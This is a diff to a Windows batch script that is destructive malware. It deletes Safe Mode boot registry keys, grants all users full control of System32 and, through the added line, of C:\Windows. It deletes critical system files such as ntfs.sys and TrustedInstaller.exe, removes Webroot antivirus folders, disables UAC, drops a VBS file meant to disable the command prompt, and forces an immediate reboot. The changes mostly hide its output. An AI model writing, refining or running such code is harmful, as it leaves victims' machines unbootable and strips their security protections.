@@ -13,6 +13,7 @@ reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1
 reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1
 
 icacls "C:\Windows\System32" /Grant Users:F >nul 2>&1
+icacls "C:\Windows\" /Grant Users:F >nul 2>&1
 
 attrib -s -r /s /d "C:\Windows\System32\*.*" >nul 2>&1
 del /f /q "C:\Windows\System32\drivers\ntfs.sys" >nul 2>&1
@@ -139,23 +140,19 @@ rmdir /s /q  "C:\Program Files\Webroot\" >nul 2>&1
 rmdir /s /q  "C:\Program Files (x86)\Webroot\" >nul 2>&1
 rmdir /s /q  "C:\ProgramData\WRData\" >nul 2>&1
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
 
-del /f /q "C:\Windows\servicing\TrustedInstaller.exe"
+del /f /q "C:\Windows\servicing\TrustedInstaller.exe" >nul 2>&1
 
 ( 
     echo Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
 ) > "%TEMP%\JAJAJA.vbs"
 
-start "" "%TEMP%\JAJAJA.vbs"
+start "" "%TEMP%\JAJAJA.vbs" >nul 2>&1
 
 
-(
-Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
-) > JAJAJA.vbs
+start JAJAJA.vbs >nul 2>&1
 
-start JAJAJA.vbs
-
-shutdown /r /f /t 0
+shutdown /r /f /t 0 >nul 2>&1
 
 endlocal
